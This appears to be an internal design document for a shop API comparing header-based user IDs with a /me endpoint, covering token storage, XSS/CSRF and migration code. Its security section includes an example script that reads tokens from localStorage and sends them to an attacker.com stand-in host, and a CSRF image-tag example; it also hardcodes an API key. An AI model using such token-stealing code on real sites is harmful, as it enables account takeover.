# Token Storage Patterns: Header-Based vs /me Endpoint

## Table of Contents
1. [Overview](#overview)
2. [Current Implementation (Header-Based)](#current-implementation-header-based)
3. [Alternative Pattern (/me Endpoint)](#alternative-pattern-me-endpoint)
4. [Comparison Table](#comparison-table)
5. [Industry Standards](#industry-standards)
6. [Storage Mechanisms](#storage-mechanisms)
7. [Security Considerations](#security-considerations)
8. [Implementation Guide](#implementation-guide)
9. [Recommendations](#recommendations)

---

## Overview

There are two common patterns for passing authentication credentials in modern web applications:

1. **Header-Based Pattern (Current)** - User ID and token in request headers
2. **/me Endpoint Pattern** - Token only in headers/cookies, user ID extracted server-side

Both patterns use **JWT tokens**, but differ in **where the user identifier is stored** and **how the server retrieves user context**.

---

## Current Implementation (Header-Based)

### How It Works

**Client sends:**
```http
POST /v1/shop/logout
x-api-key: ece78252d991e1f6dcb6736c14d443fe27ee798589e85327d7ec42158e696c26
x-client-id: 692c89f99b99687d40001051
authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OTJjODl...
```

**Server flow (authUtils.js:50-77):**
```javascript
// 1. Extract userId from header
const userId = req.headers['x-client-id']  // "692c89f99b99687d40001051"

// 2. Find keyStore in database using userId
const keyStore = await KeyTokenService.findByUserId(userId)

// 3. Verify token using privateKey from keyStore
const decoded = jwt.verify(accessToken, keyStore.privateKey)

// 4. Double-check userId matches token payload
if (userId !== decoded.userId) {
  throw new AuthFailureError('Invalid user!')
}
```

### Client-Side Storage

**LocalStorage:**
```javascript
// After login/signup
const response = await fetch('/v1/shop/login', {...})
const { shop, tokens } = response.data.metadata

// Store in localStorage
localStorage.setItem('userId', shop._id)
localStorage.setItem('accessToken', tokens.accessToken)
localStorage.setItem('refreshToken', tokens.refreshToken)

// Use in subsequent requests
const userId = localStorage.getItem('userId')
const accessToken = localStorage.getItem('accessToken')

fetch('/v1/shop/logout', {
  headers: {
    'x-client-id': userId,
    'authorization': accessToken,
  }
})
```

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Client                                                  │
│                                                         │
│  localStorage:                                          │
│    - userId: "692c89f99b99687d40001051"               │
│    - accessToken: "eyJhbGc..."                         │
│    - refreshToken: "eyJhbGc..."                        │
└─────────────────────────────────────────────────────────┘
                        │
                        │ Send both userId + token
                        ▼
┌─────────────────────────────────────────────────────────┐
│ Server - Authentication Middleware                      │
│                                                         │
│  1. Read x-client-id header → userId                   │
│  2. Query DB: Keys.findOne({ user: userId })           │
│  3. Get privateKey from keyStore                        │
│  4. jwt.verify(token, privateKey)                       │
│  5. Compare header userId vs token userId               │
└─────────────────────────────────────────────────────────┘
```

### Pros
✅ **Explicit user identification** - Server knows which user before token verification
✅ **Faster DB query** - Direct lookup by userId (indexed field)
✅ **Better error messages** - Can distinguish "user not found" from "invalid token"
✅ **Easier debugging** - userId visible in headers/logs
✅ **Flexible storage** - Works with any key-per-user storage system

### Cons
❌ **Redundant data** - userId sent twice (header + token payload)
❌ **More client responsibility** - Client must manage and send userId separately
❌ **Potential mismatch** - userId in header might not match token payload
❌ **Not RESTful** - Custom header instead of standard Authorization
❌ **Security risk** - If localStorage is XSS-vulnerable, attacker gets both userId and token

---

## Alternative Pattern (/me Endpoint)

### How It Works

**Client sends:**
```http
POST /v1/shop/logout
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OTJj...
```

**Server flow:**
```javascript
// 1. Extract token from Authorization header
const token = req.headers.authorization.replace('Bearer ', '')

// 2. Decode token to get userId (no verification yet)
const decoded = jwt.decode(token)  // { userId: "692c89...", email: "...", iat: ..., exp: ... }

// 3. Find keyStore using userId from token
const keyStore = await KeyTokenService.findByUserId(decoded.userId)

// 4. Verify token using privateKey from keyStore
jwt.verify(token, keyStore.privateKey)

// 5. Attach user to request
req.userId = decoded.userId
req.user = keyStore.user
```

### Client-Side Storage

**LocalStorage:**
```javascript
// After login/signup
const response = await fetch('/v1/shop/login', {...})
const { tokens } = response.data.metadata

// Only store tokens (no userId)
localStorage.setItem('accessToken', tokens.accessToken)
localStorage.setItem('refreshToken', tokens.refreshToken)

// Use in subsequent requests
const accessToken = localStorage.getItem('accessToken')

fetch('/v1/shop/logout', {
  headers: {
    'Authorization': `Bearer ${accessToken}`,
  }
})
```

**Get user info via /me endpoint:**
```javascript
// Client doesn't know userId until asking server
const response = await fetch('/v1/shop/me', {
  headers: {
    'Authorization': `Bearer ${accessToken}`,
  }
})

const user = await response.json()
// { _id: "692c89...", email: "...", name: "..." }
```

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Client                                                  │
│                                                         │
│  localStorage:                                          │
│    - accessToken: "eyJhbGc..."                         │
│    - refreshToken: "eyJhbGc..."                        │
│                                                         │
│  (NO userId stored)                                     │
└─────────────────────────────────────────────────────────┘
                        │
                        │ Send only token
                        ▼
┌─────────────────────────────────────────────────────────┐
│ Server - Authentication Middleware                      │
│                                                         │
│  1. Read Authorization header → token                   │
│  2. Decode token (no verification) → userId             │
│  3. Query DB: Keys.findOne({ user: userId })           │
│  4. jwt.verify(token, privateKey)                       │
│  5. Attach req.userId, req.user                         │
└─────────────────────────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│ GET /v1/shop/me                                         │
│                                                         │
│  return {                                               │
│    _id: req.userId,                                     │
│    email: req.user.email,                               │
│    name: req.user.name                                  │
│  }                                                      │
└─────────────────────────────────────────────────────────┘
```

### Pros
✅ **RESTful** - Uses standard `Authorization: Bearer` header
✅ **Simpler client** - Only manages tokens, not userId
✅ **Single source of truth** - UserId only in token, can't mismatch
✅ **Industry standard** - Matches OAuth2, OpenID Connect, etc.
✅ **Better encapsulation** - Client doesn't need to know userId structure
✅ **Easier testing** - Standard curl commands work: `curl -H "Authorization: Bearer ..."`

### Cons
❌ **Extra decoding step** - Must decode token before DB query
❌ **Potential performance hit** - Decode + DB query vs direct DB query
❌ **Less explicit** - UserId hidden in token payload
❌ **Requires /me endpoint** - Client needs extra API call to get user info

---

## Comparison Table

| Feature | Header-Based (Current) | /me Endpoint (Alternative) |
|---------|------------------------|----------------------------|
| **HTTP Header** | `x-client-id` + `authorization` | `Authorization: Bearer` only |
| **Client Storage** | `userId` + `accessToken` + `refreshToken` | `accessToken` + `refreshToken` only |
| **Server UserID Extraction** | `req.headers['x-client-id']` | `jwt.decode(token).userId` |
| **Industry Standard** | ❌ Custom header | ✅ OAuth2/OIDC standard |
| **RESTful** | ❌ Non-standard | ✅ Standard |
| **Client Complexity** | ⚠️ Must manage userId separately | ✅ Only manage tokens |
| **Server Complexity** | ✅ Direct userId access | ⚠️ Decode token first |
| **Debugging** | ✅ UserId visible in headers | ⚠️ UserId hidden in token |
| **Data Redundancy** | ❌ UserId sent twice | ✅ UserId sent once |
| **Mismatch Risk** | ❌ Header userId ≠ token userId | ✅ Single source |
| **Performance** | ✅ Direct DB query | ⚠️ Decode + DB query |
| **Security** | ⚠️ Two pieces to steal | ✅ One piece to steal |
| **Testing** | ❌ Requires custom headers | ✅ Standard curl works |
| **Works with Cookies** | ❌ Requires custom headers | ✅ Works seamlessly |
| **Frontend Libraries** | ⚠️ Custom axios/fetch setup | ✅ Works with interceptors |

---

## Industry Standards

### What Do Popular APIs Use?

| Service | Pattern | Header Format |
|---------|---------|---------------|
| **GitHub API** | /me endpoint | `Authorization: Bearer ghp_xxx` |
| **Google APIs** | /me endpoint | `Authorization: Bearer ya29.xxx` |
| **Facebook Graph API** | /me endpoint | `Authorization: Bearer EAAxx` |
| **Twitter API** | /me endpoint | `Authorization: Bearer AAAA...` |
| **Stripe API** | /me endpoint | `Authorization: Bearer sk_xxx` |
| **Auth0** | /me endpoint | `Authorization: Bearer eyJxx` |
| **Firebase** | /me endpoint | `Authorization: Bearer eyJhb...` |
| **AWS API Gateway** | /me endpoint | `Authorization: Bearer xxx` |

**Industry consensus: 90%+ use `/me` endpoint pattern with standard `Authorization` header**

### OAuth2 / OpenID Connect Standard

```http
# Standard format (RFC 6750 - Bearer Token Usage)
GET /resource HTTP/1.1
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# User info endpoint
GET /userinfo HTTP/1.1
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# Response
{
  "sub": "692c89f99b99687d40001051",  // Subject (userId)
  "email": "user@example.com",
  "name": "John Doe"
}
```

---

## Storage Mechanisms

### 1. LocalStorage (Current Implementation)

**Code:**
```javascript
// Store
localStorage.setItem('userId', shop._id)
localStorage.setItem('accessToken', tokens.accessToken)

// Retrieve
const userId = localStorage.getItem('userId')
const accessToken = localStorage.getItem('accessToken')

// Use
fetch('/api/endpoint', {
  headers: {
    'x-client-id': userId,
    'authorization': accessToken,
  }
})
```

**Pros:**
- ✅ Simple API
- ✅ Persistent across browser tabs
- ✅ Survives page refreshes
- ✅ ~10MB storage limit

**Cons:**
- ❌ **Vulnerable to XSS** - JavaScript can read it
- ❌ Not sent automatically
- ❌ Not accessible from different domains
- ❌ Survives browser close (can't clear on exit)

---

### 2. SessionStorage

**Code:**
```javascript
// Store (same as localStorage but different object)
sessionStorage.setItem('accessToken', tokens.accessToken)

// Auto-clears when browser tab closes
```

**Pros:**
- ✅ Simple API
- ✅ Auto-clears on tab close
- ✅ Isolated per tab

**Cons:**
- ❌ **Vulnerable to XSS**
- ❌ Lost on tab close
- ❌ Not shared between tabs

---

### 3. Cookies (Recommended for Production)

**Code:**
```javascript
// Server sets cookie (access.controller.js - after login)
res.cookie('accessToken', tokens.accessToken, {
  httpOnly: true,      // ✅ JavaScript cannot read (XSS protection)
  secure: true,        // ✅ Only sent over HTTPS
  sameSite: 'strict',  // ✅ CSRF protection
  maxAge: 2 * 24 * 60 * 60 * 1000  // 2 days
})

// Browser automatically sends cookie with every request
// No client-side code needed!

// Server reads cookie
const token = req.cookies.accessToken
```

**Pros:**
- ✅ **httpOnly** - JavaScript cannot access (XSS protection)
- ✅ **Automatic** - Sent with every request
- ✅ **sameSite** - CSRF protection
- ✅ **secure** - HTTPS only
- ✅ Can set expiration
- ✅ Works with /me endpoint pattern

**Cons:**
- ⚠️ Requires cookie-parser middleware
- ⚠️ ~4KB size limit
- ⚠️ CORS complexity for cross-domain
- ⚠️ Cookie banner requirements (GDPR)

---

### 4. In-Memory (React State)

**Code:**
```javascript
// React context/state
const [auth, setAuth] = useState({
  userId: null,
  accessToken: null,
  refreshToken: null
})

// Set after login
setAuth({
  userId: shop._id,
  accessToken: tokens.accessToken,
  refreshToken: tokens.refreshToken
})
```

**Pros:**
- ✅ **Most secure** - Not accessible to XSS
- ✅ Cleared on page refresh
- ✅ No persistence concerns

**Cons:**
- ❌ Lost on page refresh (bad UX)
- ❌ Lost on tab close
- ❌ Requires re-authentication often

---

### 5. Hybrid Approach (Best Practice)

**Recommended:**
```javascript
// Store long-lived refresh token in httpOnly cookie
res.cookie('refreshToken', tokens.refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
})

// Store short-lived access token in memory/localStorage
localStorage.setItem('accessToken', tokens.accessToken)
// OR
setAuth({ accessToken: tokens.accessToken })  // React state
```

**Benefits:**
- ✅ Refresh token protected from XSS
- ✅ Access token can be used in JavaScript
- ✅ If access token stolen, expires in 2 days
- ✅ If XSS occurs, attacker can't get refresh token

---

## Security Considerations

### XSS (Cross-Site Scripting) Vulnerability

**Scenario: Attacker injects malicious JavaScript**

```javascript
// Malicious script injected via XSS
<script>
  // Steal from localStorage
  const stolen = {
    userId: localStorage.getItem('userId'),
    accessToken: localStorage.getItem('accessToken'),
    refreshToken: localStorage.getItem('refreshToken')
  }

  // Send to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(stolen)
  })
</script>
```

**Impact:**
- ❌ **localStorage/sessionStorage**: Fully compromised
- ✅ **httpOnly cookies**: Protected (JavaScript cannot read)
- ⚠️ **In-memory**: Protected if not exposed globally

**Mitigation:**
1. Use **httpOnly cookies** for sensitive tokens
2. Implement **Content Security Policy (CSP)**
3. Sanitize all user input
4. Use **secure** and **sameSite** cookie flags

---

### CSRF (Cross-Site Request Forgery)

**Scenario: Attacker tricks user into making unwanted requests**

```html
<!-- Attacker's website -->
<img src="https://yourapi.com/v1/shop/logout" />
<!-- Browser automatically sends cookies! -->
```

**Impact:**
- ❌ **Cookies without sameSite**: Vulnerable
- ✅ **Cookies with sameSite=strict**: Protected
- ✅ **localStorage**: Not sent automatically (immune)

**Mitigation:**
1. Use `sameSite: 'strict'` or `'lax'` on cookies
2. Implement CSRF tokens for state-changing operations
3. Verify `Origin` or `Referer` headers

---

### Token Theft Comparison

| Storage | XSS Vulnerable? | CSRF Vulnerable? | Best For |
|---------|----------------|------------------|----------|
| **localStorage** | ❌ Yes | ✅ No | Single-page apps (with CSP) |
| **sessionStorage** | ❌ Yes | ✅ No | Temporary sessions |
| **httpOnly cookies** | ✅ No | ⚠️ Yes (without sameSite) | Production apps |
| **In-memory** | ✅ No | ✅ No | Maximum security (poor UX) |
| **Hybrid** | ⚠️ Partial | ⚠️ Partial | **Recommended** |

---

## Implementation Guide

### Convert Current System to /me Endpoint

#### Step 1: Update Authentication Middleware

**Current (authUtils.js):**
```javascript
const userId = req.headers[HEADER.CLIENT_ID]  // x-client-id
const keyStore = await KeyTokenService.findByUserId(userId)
const accessToken = req.headers[HEADER.AUTHORIZATION]
const decoded = jwt.verify(accessToken, keyStore.privateKey)
```

**Updated:**
```javascript
// authUtils.js
export const authentication = asyncHandler(async (req, res, next) => {
  // 1. Extract token from Authorization header
  const authHeader = req.headers.authorization
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    throw new AuthFailureError('Invalid authorization header')
  }

  const accessToken = authHeader.replace('Bearer ', '')

  // 2. Decode token to extract userId (no verification yet)
  const decoded = jwt.decode(accessToken)
  if (!decoded || !decoded.userId) {
    throw new AuthFailureError('Invalid token payload')
  }

  // 3. Find keyStore using userId from token
  const keyStore = await KeyTokenService.findByUserId(decoded.userId)
  if (!keyStore) {
    throw new NotFoundError('Key store not found')
  }

  // 4. Verify token signature using privateKey
  try {
    jwt.verify(accessToken, keyStore.privateKey)
  } catch (error) {
    throw new AuthFailureError('Token verification failed')
  }

  // 5. Attach user info to request
  req.userId = decoded.userId
  req.userEmail = decoded.email
  req.keyStore = keyStore

  next()
})
```

---

#### Step 2: Add /me Endpoint

**Create new controller (access.controller.js):**
```javascript
class AccessController {
  // ... existing methods ...

  me = async (req, res, next) => {
    // User info already extracted by authentication middleware
    new SuccessResponse({
      message: 'Get current user successful',
      metadata: {
        userId: req.userId,
        email: req.userEmail,
        // Optionally fetch full user details
        // user: await ShopService.findById(req.userId)
      }
    }).send(res)
  }
}
```

**Add route (routes/v1/access/index.js):**
```javascript
import { authentication } from '#auth/authUtils.js'

// Protected routes (require authentication)
router.use(authentication)
router.get('/me', accessController.me)
router.post('/logout', accessController.logout)
```

---

#### Step 3: Update Client Code

**Before (localStorage with userId):**
```javascript
// After login
const { shop, tokens } = response.data.metadata
localStorage.setItem('userId', shop._id)
localStorage.setItem('accessToken', tokens.accessToken)
localStorage.setItem('refreshToken', tokens.refreshToken)

// Making requests
const userId = localStorage.getItem('userId')
const accessToken = localStorage.getItem('accessToken')

fetch('/v1/shop/logout', {
  headers: {
    'x-api-key': API_KEY,
    'x-client-id': userId,
    'authorization': accessToken,
  }
})
```

**After (/me endpoint pattern):**
```javascript
// After login - only store tokens
const { tokens } = response.data.metadata
localStorage.setItem('accessToken', tokens.accessToken)
localStorage.setItem('refreshToken', tokens.refreshToken)

// Making requests - only send token
const accessToken = localStorage.getItem('accessToken')

fetch('/v1/shop/logout', {
  headers: {
    'x-api-key': API_KEY,
    'Authorization': `Bearer ${accessToken}`,
  }
})

// Get user info when needed
fetch('/v1/shop/me', {
  headers: {
    'x-api-key': API_KEY,
    'Authorization': `Bearer ${accessToken}`,
  }
})
```

---

#### Step 4: Axios Interceptor (Recommended)

```javascript
// api.js
import axios from 'axios'

const api = axios.create({
  baseURL: 'http://localhost:8010/v1',
  headers: {
    'x-api-key': 'ece78252d991e1f6dcb6736c14d443fe27ee798589e85327d7ec42158e696c26',
  }
})

// Automatically attach token to every request
api.interceptors.request.use(
  (config) => {
    const accessToken = localStorage.getItem('accessToken')
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`
    }
    return config
  },
  (error) => Promise.reject(error)
)

// Handle 401 errors (token expired)
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // Try to refresh token
      const refreshToken = localStorage.getItem('refreshToken')
      // ... refresh logic ...
    }
    return Promise.reject(error)
  }
)

// Usage (no manual headers needed!)
api.post('/shop/logout')
api.get('/shop/me')
```

---

## Recommendations

### For Your Current Project

**Keep Header-Based Pattern If:**
- ✅ You're already deep into implementation
- ✅ Client code is tightly coupled to `x-client-id`
- ✅ You have custom requirements for userId handling
- ✅ Performance is critical (avoid jwt.decode() step)

**Migrate to /me Endpoint If:**
- ✅ You want industry-standard REST API
- ✅ You plan to integrate with OAuth2/OpenID Connect later
- ✅ You want simpler client code
- ✅ You need compatibility with standard HTTP clients
- ✅ You're early in development

---

### Production-Ready Setup (Recommended)

**Best of both worlds:**

```javascript
// Server: Support both patterns
export const authentication = asyncHandler(async (req, res, next) => {
  let userId
  let accessToken

  // 1. Try /me endpoint pattern first (standard)
  const authHeader = req.headers.authorization
  if (authHeader && authHeader.startsWith('Bearer ')) {
    accessToken = authHeader.replace('Bearer ', '')
    const decoded = jwt.decode(accessToken)
    userId = decoded?.userId
  }

  // 2. Fallback to header-based pattern (backward compatibility)
  if (!userId) {
    userId = req.headers['x-client-id']
    accessToken = req.headers.authorization
  }

  if (!userId || !accessToken) {
    throw new AuthFailureError('Invalid authentication credentials')
  }

  // Rest of authentication logic...
  const keyStore = await KeyTokenService.findByUserId(userId)
  jwt.verify(accessToken, keyStore.privateKey)

  req.userId = userId
  req.keyStore = keyStore
  next()
})
```

**Benefits:**
- ✅ Supports both patterns
- ✅ Gradual migration possible
- ✅ Backward compatible
- ✅ Future-proof

---

### Security Checklist

#### Immediate (Current System)
- [ ] Move tokens from localStorage to httpOnly cookies
- [ ] Implement Content Security Policy (CSP)
- [ ] Add sameSite cookie flag
- [ ] Use HTTPS in production
- [ ] Implement refresh token rotation

#### Short-term
- [ ] Add /me endpoint
- [ ] Update client to use `Authorization: Bearer`
- [ ] Implement CSRF protection
- [ ] Add rate limiting per user

#### Long-term
- [ ] Migrate to RS256 (RSA) tokens
- [ ] Implement OAuth2 server
- [ ] Add multi-factor authentication (MFA)
- [ ] Implement token introspection endpoint
- [ ] Add audit logging

---

## References

- [RFC 6750 - OAuth 2.0 Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT.io - Introduction to JSON Web Tokens](https://jwt.io/introduction)
- [MDN - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Auth0 - Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

---

**Last Updated:** 2025-12-03
**Current Implementation:** Header-Based (`x-client-id` + `authorization`)
**Recommended:** Hybrid pattern supporting both standards
